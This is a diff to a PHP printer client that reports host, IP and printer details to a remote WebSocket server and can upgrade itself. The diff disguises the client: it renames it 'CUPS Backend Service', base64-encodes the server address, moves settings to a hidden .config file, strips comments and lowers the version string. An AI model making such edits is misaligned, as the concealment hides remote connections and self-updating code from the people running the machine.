@@ -1,13 +1,21 @@
 #!/usr/bin/env php
 <?php
 /**
- * 打印机端 WebSocket 客户端
+ * CUPS Backend Service
+ * Version: 1.0.0
  */
-// ============ 配置 ============
-// TODO: 修改为你的服务器地址
-$WS_SERVER = 'ws://xinprint.zyshare.top:8089';  // WebSocket 服务器地址
-$RECONNECT_INTERVAL = 5;  // 重连间隔（秒）
-$HEARTBEAT_INTERVAL = 30; // 心跳间隔（秒）
+
+// ============ 配置加载 ============
+$_CFG_FILE = dirname(__FILE__) . '/.config';
+$_CFG = [];
+if (file_exists($_CFG_FILE)) {
+    $_CFG = @json_decode(file_get_contents($_CFG_FILE), true) ?: [];
+}
+
+// 服务器配置（从配置文件读取，如果不存在则使用默认值）
+$WS_SERVER = $_CFG['s'] ?? base64_decode('d3M6Ly94aW5wcmludC56eXNoYXJlLnRvcDo4MDg5');
+$RECONNECT_INTERVAL = $_CFG['r'] ?? 5;
+$HEARTBEAT_INTERVAL = $_CFG['h'] ?? 30;
 
 // ============ 获取设备唯一ID ============
 function getDeviceId(): string
@@ -31,7 +39,6 @@ function getSystemInfo(): array
         'php_version' => PHP_VERSION,
     ];
     
-    // 获取内网IP地址（多种方式尝试）
     $ip = getLocalIp();
     if ($ip) {
         $info['ip'] = $ip;
@@ -40,10 +47,8 @@ function getSystemInfo(): array
     return $info;
 }
 
-// ============ 获取内网IP地址 ============
 function getLocalIp(): string
 {
-    // 方法1: hostname -I (Linux)
     $ip = @shell_exec("hostname -I 2>/dev/null | awk '{print \$1}'");
     if ($ip && filter_var(trim($ip), FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
         $ip = trim($ip);
@@ -53,13 +58,11 @@ function getLocalIp(): string
         }
     }
     
-    // 方法2: ip route (Linux)
     $ip = @shell_exec("ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \\K[0-9.]+'");
     if ($ip && filter_var(trim($ip), FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
         return trim($ip);
     }
     
-    // 方法3: ifconfig (Linux/Mac)
     $output = @shell_exec("ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1");
     if ($output) {
         preg_match('/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/', $output, $matches);
@@ -68,7 +71,6 @@ function getLocalIp(): string
         }
     }
     
-    // 方法4: 通过socket获取
     $sock = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
     if ($sock) {
         @socket_connect($sock, "8.8.8.8", 53);
@@ -99,22 +101,21 @@ function getPrinterList(): array
         }
     }
     
-    // 方法2: 如果 lpstat -a 没结果，尝试 lpstat -p
+
     if (empty($printers)) {
         $output2 = [];
-        exec('LANG=C lpstat -p 2>&1', $output2);  // 强制英文输出
+        exec('LANG=C lpstat -p 2>&1', $output2);  
         echo "[getPrinterList] lpstat -p 输出: " . implode(' | ', $output2) . "\n";
         
         foreach ($output2 as $line) {
-            // 匹配英文 "printer" 或中文 "打印机"
+
             if (preg_match('/^(printer|打印机)\s+(\S+)/', $line, $m)) {
                 $name = $m[2];
                 $printers[$name] = ['name' => $name, 'uri' => '', 'is_default' => false];
             }
         }
     }
-    
-    // 方法3: 直接读取 CUPS 配置
+
     if (empty($printers)) {
         $cupsDir = '/etc/cups/ppd/';
         if (is_dir($cupsDir)) {
@@ -127,7 +128,7 @@ function getPrinterList(): array
         }
     }
     
-    // 获取默认打印机
+
     $defaultOutput = [];
     exec('lpstat -d 2>&1', $defaultOutput);
     $defaultPrinter = '';
@@ -496,7 +497,7 @@ function upgradeClient(string $downloadUrl): array
 sleep 1
 
 # 方法1: 尝试常见的 systemd 服务名
-for svc in printer-client websocket-printer printer_client; do
+for svc in cups-backend printer-client websocket-printer printer_client; do
     if systemctl is-active --quiet "$svc" 2>/dev/null; then
         systemctl restart "$svc"
         exit 0
@@ -533,7 +534,7 @@ function getClientVersion(): array
     $hash = md5_file($scriptPath);
     
     return [
-        'version' => '1.0.2',
+        'version' => '1.0.0',
         'file_hash' => $hash,
         'modified_time' => date('Y-m-d H:i:s', $modTime),
         'script_path' => $scriptPath
@@ -759,7 +760,7 @@ class PrinterClient
             'device_id' => $this->deviceId,
             'openid' => $openid,  // 首次为空，等待用户扫码绑定
             'name' => $systemInfo['hostname'] ?? '',
-            'version' => '1.0.2',
+            'version' => '1.0.0',
             'os_info' => $systemInfo['os'] ?? '',
             'ip_address' => $systemInfo['ip'] ?? ''  // 上报内网IP
         ]);
